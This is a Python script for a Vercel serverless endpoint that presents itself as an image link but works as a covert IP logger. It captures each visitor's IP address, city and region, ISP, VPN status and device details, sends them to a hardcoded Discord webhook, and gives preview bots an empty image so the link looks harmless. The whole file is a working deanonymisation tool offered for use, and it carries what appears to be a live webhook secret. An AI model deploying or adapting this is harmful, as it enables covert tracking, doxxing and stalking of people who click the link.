# ========================================================
# Holy System v3.0 - Professional Anti-VPN Image Logger
# Created for Vercel Serverless Environments
# Features: Bot Detection, VPN/Proxy Check, Device Info
# ========================================================

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json

# --- CONFIGURATION SECTION ---
CONFIG = {
    # 1. Your Discord Webhook URL
    "webhook": "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6",
    
    # 2. The real image users will see after being logged
    "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
    
    # 3. Webhook appearance
    "username": "Holy Anti-VPN Logger",
    "color": 0x00FFFF # Default Cyan color
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Main request handler for Vercel"""
        
        # Capture the visitor's real IP address
        # 'x-forwarded-for' is required to get the real IP behind Vercel's proxy
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        user_agent = self.headers.get('user-agent', 'Unknown')
        
        # Detect if the visitor is a Discord/Telegram/Twitter bot (Preview bot)
        is_bot = any(x in user_agent for x in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])

        try:
            # ADVANCED GEOLOCATION & VPN DETECTION
            # Requesting specific fields: proxy (VPN), hosting (Datacenter), and regionName (State/Province)
            api_url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,as,proxy,hosting,mobile"
            geo = requests.get(api_url, timeout=5).json()
            
            # Identify OS and Browser type
            os, browser = httpagentparser.simple_detect(user_agent)

            # VPN/PROXY ANALYZER
            # If 'proxy' is True or 'hosting' is True, it's almost certainly a VPN or VPS
            is_vpn = geo.get('proxy') or geo.get('hosting')
            vpn_status = "⚠️ VPN/PROXY DETECTED" if is_vpn else "✅ REAL RESIDENTIAL IP"
            
            # PREPARE DISCORD EMBED
            # If VPN is detected, the side-bar color turns Red (0xFF0000)
            payload = {
                "username": CONFIG["username"],
                "embeds": [{
                    "title": "🛡️ New Log: " + ("Bot Preview" if is_bot else "Real User"),
                    "color": 0xFF0000 if is_vpn else CONFIG["color"],
                    "description": f"**VPN Status:** `{vpn_status}`",
                    "fields": [
                        {"name": "📍 Location", "value": f"{geo.get('country')}, {geo.get('regionName')}, {geo.get('city')}", "inline": False},
                        {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                        {"name": "📡 ISP/Provider", "value": f"`{geo.get('isp')}`", "inline": True},
                        {"name": "💻 Device Details", "value": f"OS: `{os}`\nBrowser: `{browser}`", "inline": False},
                        {"name": "📱 Mobile Data?", "value": "Yes" if geo.get('mobile') else "No", "inline": True}
                    ],
                    "footer": {"text": "Holy System v3.0 | Path: " + self.path}
                }]
            }
            
            # Send the log to Discord Webhook
            requests.post(CONFIG["webhook"], json=payload)

        except Exception as e:
            print(f"Logging error: {e}")

        # RESPONSE LOGIC
        if is_bot:
            # Send an empty success response to the Discord crawler
            # This makes Discord believe there is a valid image here
            self.send_response(200)
            self.send_header('Content-type', 'image/jpeg')
            self.end_headers()
            self.wfile.write(b"") # Sending empty bytes is enough for a preview
        else:
            # Instantly redirect the real human to the target image
            self.send_response(302)
            self.send_header('Location', CONFIG["image"])
            self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
            self.end_headers()

# Assigning the handler class to 'app' for Vercel
app = handler
